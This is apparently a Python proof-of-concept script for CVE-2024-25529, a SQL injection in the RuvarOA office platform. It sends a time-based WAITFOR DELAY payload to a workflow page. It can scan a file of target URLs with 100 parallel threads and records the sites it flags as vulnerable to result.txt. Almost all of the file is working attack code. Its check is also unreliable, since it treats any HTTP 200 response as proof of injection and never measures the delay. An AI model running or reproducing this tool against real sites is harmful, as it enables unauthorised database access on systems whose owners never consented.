import argparse, sys, re, requests
from multiprocessing.dummy import Pool
# 禁用urllib3警告
requests.packages.urllib3.disable_warnings()
# 输出颜色
GREEN = '\033[92m'  
RESET = '\033[0m'

# 打印程序欢迎界面
def banner():
    test = """                              _                      
       _                     ( )                   _ 
      (_)   _ _    _     ___ | |__   _   _    _ _ (_)
(`\/')| | /'_` ) /'_`\ /',__)|  _ `\( ) ( ) /'_` )| |
 >  < | |( (_| |( (_) )\__, \| | | || (_) |( (_| || |  version:1.0.0
(_/\_)(_)`\__,_)`\___/'(____/(_) (_)`\___/'`\__,_)(_)  author :冷酷小帅
"""
    print(test)

# 主函数
def main():
    banner() # 打印欢迎界面
    parser = argparse.ArgumentParser(description="CVE-2024-25529 RuvarOA协同办公平台 SQL注入")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
    args = parser.parse_args()

    # 如果提供了url而没有提供文件路径
    if args.url and not args.file:
        poc(args.url)
    # 如果提供了文件路径而没有提供url
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100) # 创建一个线程池，最大线程数为100
        mp.map(poc,url_list) # 映射poc函数到url列表，并行执行
        mp.close() # 关闭线程池
        mp.join() # 等待所有线程执行完毕
    else:
        print(f"Uage:\n\t python3 {sys.argv[0]} -h")

# 漏洞检测函数
def poc(target):
    # 构造payload的url
    payload_url = '/WorkFlow/wf_office_file_history_show.aspx?id=1%27WAITFOR%20DELAY%20%270:0:5%27'
    url = target + payload_url
    headers = {
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'micromessenger Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Iron Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'sec-ch-ua-platform':'"Windows"',
        'sec-ch-ua':'"Google Chrome";v="115", "Chromium";v="115", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile':'?0',
        'Connection':'close',
    }

    try:
        res = requests.post(url=url,headers=headers,timeout=5,verify=False)
        if res.status_code == 200:
            print(f"{GREEN}[+]该网站存在SQL注入漏洞{target}\n{RESET}")
            with open("result.txt","a",encoding="utf-8") as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]该网站不存在SQL注入漏洞")

    except Exception as e:
        print(f"[*]该网站无法访问")

# 程序入口
if __name__ == '__main__':
    main()